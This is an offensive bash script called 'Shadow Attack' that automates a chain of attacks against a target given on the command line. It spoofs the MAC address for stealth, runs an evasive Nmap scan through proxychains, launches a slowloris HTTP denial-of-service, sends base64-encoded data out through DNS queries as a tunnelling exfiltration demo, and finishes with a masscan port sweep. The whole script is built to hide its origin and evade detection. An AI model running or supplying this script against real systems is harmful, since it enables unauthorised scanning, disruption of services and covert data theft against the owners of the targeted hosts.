#!/bin/bash
echo "===== Shadow Attack: Stealth Multi-Tool Automation ====="
TARGET="$1"
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target-ip-or-domain>"
    exit 1
fi

echo "[*] Randomizing MAC address for stealth..."
sudo macchanger -r eth0 >/dev/null 2>&1

echo "[*] Running fragmented Nmap scan with randomized timing/user-agent..."
proxychains nmap -sS -T2 --max-rate 50 --data-length 50 --randomize-hosts --script http-title \
  --script-args http.useragent='Mozilla/5.0 (ShadowSuite)' $TARGET -oN shadow_nmap.txt

echo "[*] Running slowloris HTTP DoS (demo, short run)..."
if command -v slowloris >/dev/null; then
  slowloris $TARGET -p 80 -s 50 -t 10 --test
else
  echo "  [-] slowloris not installed. Skipping."
fi

echo "[*] DNS Tunneling exfil demo (dnscat2-style, fake data)..."
echo "covertdata" | base64 | xargs -I{} dig {}.demo.$TARGET @8.8.8.8

echo "[*] Chain: masscan top 1000 ports, randomized..."
sudo masscan $TARGET -p1-1000 --rate=1000 -oG shadow_masscan.txt

echo "[*] Shadow Attack Complete."
